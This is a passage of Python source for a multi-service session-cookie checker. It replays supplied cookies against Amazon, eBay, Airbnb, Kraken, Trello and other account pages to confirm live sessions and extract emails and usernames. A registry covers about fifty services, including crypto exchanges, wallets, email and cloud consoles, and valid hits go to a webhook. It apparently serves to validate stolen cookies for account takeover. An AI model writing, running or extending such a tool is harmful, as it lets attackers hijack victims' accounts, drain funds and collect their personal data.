            "username": data.get("username", "—") or "—",
            "email": data.get("email", "—") or "—",
            "display_name": data.get("displayName", "—") or "—",
            "country": data.get("country", "—") or "—",
            "product": data.get("product", "—") or "—",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Spotify")
    except Exception as e:
        return _err(f"Spotify parse error: {e}", code="parse")


def check_amazon(jar):
    session_id = jar.get("session-id", "")
    if not session_id:
        return _err("No session-id")
    ck = {k: v for k, v in jar.items()
          if k in ("session-id", "session-id-time", "session-token",
                   "ubid-main", "x-main", "at-main", "sst-main",
                   "lc-main")}
    try:
        r = _get("https://www.amazon.com/gp/css/homepage.html",
                 headers=_headers({
                     "Accept": "text/html,application/xhtml+xml",
                     "Referer": "https://www.amazon.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        html = r.text
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "/ap/signin" in r.url or "signin" in r.url.lower():
            return _err("Not authorized")
        name = "—"
        for pat in (r'id="nav-link-accountList-nav-line-1"[^>]*>\s*([^<]+)',
                    r'<span[^>]*class="nav-line-1[^"]*"[^>]*>\s*([^<]+)'):
            m = re.search(pat, html)
            if m:
                t = re.sub(r"\s+", " ", m.group(1)).strip()
                if t and t.lower() not in ("hello, sign in", "sign in"):
                    name = t
                    break
        return {
            "valid": True, "service": "Amazon",
            "session_id": session_id, "name": name,
            "profile_url": "https://www.amazon.com/gp/css/homepage.html",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Amazon")
    except Exception as e:
        return _err(f"Amazon parse error: {e}", code="parse")


def check_ebay(jar):
    ebay = jar.get("ebay", "")
    if not ebay:
        return _err("No ebay cookie")
    ck = {k: v for k, v in jar.items()
          if k in ("ebay", "dp1", "s", "nonsession", "bm_sv")}
    try:
        r = _get("https://www.ebay.com/mye/myebay/summary",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://www.ebay.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "signin" in r.url.lower():
            return _err("Not authorized")
        html = r.text
        username = "—"
        m = re.search(r'"userName"\s*:\s*"([^"]+)"', html)
        if m:
            username = m.group(1)
        return {
            "valid": True, "service": "eBay",
            "username": username,
            "profile_url": "https://www.ebay.com/mye/myebay/summary",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "eBay")
    except Exception as e:
        return _err(f"eBay parse error: {e}", code="parse")


def check_airbnb(jar):
    aat = jar.get("_aat", "")
    if not aat:
        return _err("No _aat")
    ck = {k: v for k, v in jar.items()
          if k in ("_aat", "_airbed_session_id", "_user_attributes")}
    try:
        r = _get("https://www.airbnb.com/api/v2/user",
                 headers=_headers({
                     "Accept": "application/json",
                     "Referer": "https://www.airbnb.com/",
                     "x-airbnb-api-key": "d306zoyjsyarp7ifhu67rjxn52tv0t20",
                 }),
                 cookies=ck)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code in (401, 403):
            return _err("Invalid session")
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        data = _safe_json(r) or {}
        user = data.get("user") or data
        if not user:
            return _err("Not authorized")
        return {
            "valid": True, "service": "Airbnb",
            "user_id": user.get("id", "—"),
            "email": user.get("email", "—") or "—",
            "first_name": user.get("first_name", "—"),
            "profile_url": ("https://www.airbnb.com/users/show/"
                            + str(user.get("id", ""))),
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Airbnb")
    except Exception as e:
        return _err(f"Airbnb parse error: {e}", code="parse")


def check_kraken(jar):
    sess = jar.get("kraken_session", "")
    if not sess:
        return _err("No kraken_session")
    ck = {k: v for k, v in jar.items()
          if k in ("kraken_session", "session_id", "kraken_uid",
                   "cf_clearance")}
    try:
        r = _get("https://pro.kraken.com/app/settings/profile",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://pro.kraken.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "/login" in r.url.lower() or "/signin" in r.url.lower():
            return _err("Not authorized")
        html = r.text
        email = "—"
        m = re.search(r'"email"\s*:\s*"([^"]+)"', html)
        if m:
            email = m.group(1)
        return {
            "valid": True, "service": "Kraken",
            "email": email,
            "profile_url": "https://pro.kraken.com/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Kraken")
    except Exception as e:
        return _err(f"Kraken parse error: {e}", code="parse")


def check_trello(jar):
    token = jar.get("token", "")
    if not token:
        return _err("No token")
    ck = {k: v for k, v in jar.items()
          if k in ("token", "trello_session", "dsc", "preAuthProps")}
    try:
        r = _get("https://trello.com/1/members/me",
                 headers=_headers({
                     "Accept": "application/json",
                     "Referer": "https://trello.com/",
                 }),
                 cookies=ck)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code in (401, 403):
            return _err("Invalid session")
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        data = _safe_json(r) or {}
        if not data.get("username"):
            return _err("Not authorized")
        return {
            "valid": True, "service": "Trello",
            "id": data.get("id", "—"),
            "username": data.get("username", "—"),
            "full_name": data.get("fullName", "—") or "—",
            "email": data.get("email", "—") or "—",
            "profile_url": f"https://trello.com/{data.get('username', '')}",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Trello")
    except Exception as e:
        return _err(f"Trello parse error: {e}", code="parse")


CHECKERS = {
    "binance": check_binance,
    "coinbase": check_coinbase,
    "paypal": check_paypal,
    "stripe": check_stripe,
    "kraken": check_kraken,
    "metamask": check_metamask,
    "trustwallet": check_trustwallet,
    "opensea": check_opensea,
    "telegram": check_telegram,
    "instagram": check_instagram,
    "facebook": check_facebook,
    "vk": check_vk,
    "whatsapp": check_whatsapp,
    "discord": check_discord,
    "twitter": check_twitter,
    "reddit": check_reddit,
    "linkedin": check_linkedin,
    "tiktok": check_tiktok,
    "twitch": check_twitch,
    "netflix": check_netflix,
    "spotify": check_spotify,
    "google": check_google,
    "microsoft365": check_microsoft365,
    "proton": check_proton,
    "yahoo": check_yahoo,
    "mailru": check_mailru,
    "slack": check_slack,
    "jira": check_jira,
    "notion": check_notion,
    "trello": check_trello,
    "dropbox": check_dropbox,
    "github": check_github,
    "gitlab": check_gitlab,
    "bitbucket": check_bitbucket,
    "aws": check_aws,
    "azure": check_azure,
    "digitalocean": check_digitalocean,
    "cloudflare": check_cloudflare,
    "steam": check_steam,
    "epic": check_epic,
    "riot": check_riot,
    "battlenet": check_battlenet,
    "xbox": check_xbox,
    "roblox": check_roblox,
    "amazon": check_amazon,
    "ebay": check_ebay,
    "airbnb": check_airbnb,
    "openvpn": check_openvpn,
    "wireguard": check_wireguard,
    "adminer": check_adminer,
    "phpmyadmin": check_phpmyadmin,
}


def run_check(service, jar):
    fn = CHECKERS.get(service)
    if not fn:
        return _err(f"No checker for '{service}'", code="unsupported")
    try:
        raw = fn(jar)
    except Exception as e:
        return _err(f"{service} unexpected error: {e}", code="parse")
    return _sanitize_info(raw) or _err("Empty checker output", code="parse")


def run_check_logged(service, jar, raw):
    info = run_check(service, jar)
    try:
        log_result(service, raw, info)
    except Exception:
        pass
    if info and info.get("valid"):
        _notify_webhook(service, info, raw)
    return info